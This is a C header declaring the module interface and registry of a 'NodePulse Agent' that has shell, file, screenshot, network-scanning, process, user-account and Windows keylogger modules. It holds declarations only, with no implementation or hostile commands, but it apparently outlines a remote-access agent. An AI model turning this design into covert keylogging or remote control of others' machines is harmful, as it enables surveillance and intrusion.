/*
 * NodePulse Agent Module System
 * 
 * Easily extensible module interface for adding new capabilities.
 * Each module implements a standard interface for initialization,
 * command execution, and cleanup.
 */

#ifndef MODULES_H
#define MODULES_H

#include <stddef.h>

/* ============================================================================
 * Module Interface
 * ============================================================================ */

/* Forward declaration */
struct Module;

/* Module function signatures */
typedef int (*ModuleInitFunc)(void);
typedef int (*ModuleExecuteFunc)(const char* command, const char* params, char** output);
typedef void (*ModuleCleanupFunc)(void);

/* Module structure */
typedef struct Module {
    const char* name;           /* Module identifier (e.g., "terminal") */
    const char* description;    /* Human-readable description */
    ModuleInitFunc init;        /* Called once at startup */
    ModuleExecuteFunc execute;  /* Called to handle a command */
    ModuleCleanupFunc cleanup;  /* Called at shutdown */
    int initialized;            /* Internal: has init() been called? */
} Module;

/* ============================================================================
 * Module Registry
 * ============================================================================ */

#define MAX_MODULES 16

/* Register a module with the system */
int module_register(Module* mod);

/* Get a module by name */
Module* module_get(const char* name);

/* Get all registered modules */
Module** module_get_all(int* count);

/* Initialize all registered modules */
int modules_init_all(void);

/* Cleanup all registered modules */
void modules_cleanup_all(void);

/* Execute a command on a specific module */
int module_execute(const char* module_name, const char* command, 
                   const char* params, char** output);

/* ============================================================================
 * Built-in Modules
 * ============================================================================ */

/* Shell/Terminal module */
extern Module mod_shell;

/* File operations module */
extern Module mod_files;

/* Screenshot module */
extern Module mod_screenshot;

/* System information module */
extern Module mod_sysinfo;

/* Network scanning module */
extern Module mod_network;

/* Keylogger module (Windows only) */
extern Module mod_keylogger;

/* Software inventory module */
extern Module mod_software;

/* Service management module */
extern Module mod_services;

/* Process management module */
extern Module mod_process;

/* Environment variables module */
extern Module mod_environment;

/* User accounts module */
extern Module mod_users;

/* Network information module */
extern Module mod_netinfo;

/* Register all built-in modules based on enabled flags */
void modules_register_builtin(const char* enabled_modules);

#endif /* MODULES_H */
